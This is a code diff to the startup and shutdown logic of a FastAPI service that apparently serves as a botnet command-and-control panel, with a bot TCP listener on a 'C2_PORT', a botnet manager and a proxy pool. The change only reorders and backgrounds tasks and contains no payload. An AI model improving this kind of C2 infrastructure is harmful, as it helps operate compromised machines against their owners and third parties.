@@ -379,13 +379,14 @@ async def lifespan(app: FastAPI):
     # history_manager init
     await history_mgr.initialize()
 
-    # proxy_manager background refresh
-    await proxy_mgr.start_background_refresh()
-    logger.info("✅ Proxy background refresh started")
-
-    # 3. Start TCP server
+    # 3. Start TCP server FIRST (so bots can connect immediately)
     tcp_task = asyncio.create_task(start_tcp_server())
     logger.info(f"✅ TCP Bot server listening on port {settings.C2_PORT}")
+
+    # 4. Start proxy_manager background refresh (AFTER TCP server, non-blocking)
+    # Uses skip_health_check=True on initial load for fast startup
+    proxy_refresh_task = asyncio.create_task(proxy_mgr.start_background_refresh())
+    logger.info("✅ Proxy background refresh started (non-blocking)")
 
     # 4. Start periodic update broadcaster (for WebSocket real-time updates)
     broadcaster_task = asyncio.create_task(periodic_update_broadcaster())
@@ -419,6 +420,10 @@ async def lifespan(app: FastAPI):
     tcp_task.cancel()
     broadcaster_task.cancel()
     health_task.cancel()
+    try:
+        proxy_refresh_task.cancel()
+    except:
+        pass
     await proxy_mgr.stop()
     await botnet_mgr.stop()
     await close_redis()
